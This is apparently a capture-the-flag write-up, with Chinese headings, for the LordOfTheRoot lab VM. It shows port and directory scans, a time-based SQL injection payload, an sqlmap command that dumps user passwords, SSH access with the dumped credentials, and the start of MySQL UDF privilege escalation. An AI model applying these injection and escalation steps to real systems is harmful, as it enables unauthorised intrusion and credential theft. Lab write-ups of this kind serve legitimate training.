## LordOfTheRoot_1.0.1

## Nmap

```shell
# Nmap 7.94 scan initiated Sat Feb 24 11:07:48 2024 as: nmap -p- -T5 -o nmap_tcp 192.168.202.129
Nmap scan report for 192.168.202.129
Host is up (0.0014s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
MAC Address: 00:0C:29:FC:3E:CC (VMware)

# Nmap done at Sat Feb 24 11:08:44 2024 -- 1 IP address (1 host up) scanned in 56.35 seconds

```

## Dirsearch

```shell
[11:10:13] Starting: 
[11:10:28] 200 -  130B  - /404.html
[11:11:31] 200 -  500B  - /images/
[11:11:31] 301 -  325B  - /images  ->  http://192.168.202.129:1337/images/
Task Completed
```

> 查询404.html源码

```shell
echo "THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh" | base64 -d | base64 -d
得到
/978345210/index.php

```



## 延时注入

```shell
http://192.168.202.129:1337/978345210/index.php
# 注入点为：username
poc: "' or slee(3)-- -"

sudo sqlmap -r requests.txt -p username --batch --dump  -C 'username,password'-T 'Users' -D 'Webapp'

# 得到数据：
+----+------------------+----------+
| id | password         | username |
+----+------------------+----------+
| 1  | iwilltakethering | frodo    |
| 2  | MyPreciousR00t   | smeagol  |
| 3  | AndMySword       | aragorn  |
| 4  | AndMyBow         | legolas  |
| 5  | AndMyAxe         | gimli    |
+----+------------------+----------+



```

#### ssh拿到立足点

```
ssh smeagol@192.168.202.129 
```



#### MYSQL UDF提权

```sql
查看/var/www/html/978345210/login.php 发现了数据库连接的账号密码为root:darkshadow
* $db = new mysqli('localhost', 'root', 'darkshadow', 'Webapp');

select version(); 版本为5.5.44-0ubuntu0.14.04.1 ，那么动态链接库应该放到/usr/lib/mysql/plugin/下

show variables like "plugin%"; 
	/usr/lib/mysql/plugin/'

show global variables like "secure%"; 

/home/smeagol/Templates/raptor_udf2.so

/usr/lib/mysql/plugin/raptor_udf3.so
```

<img src="C:\Users\yuhao\AppData\Roaming\Typora\typora-user-images\image-20240225190825985.png" alt="image-20240225190825985" style="zoom:200%;" />

<img src="C:\Users\yuhao\AppData\Roaming\Typora\typora-user-images\image-20240225191018469.png" alt="image-20240225191018469" style="zoom:150%;" />







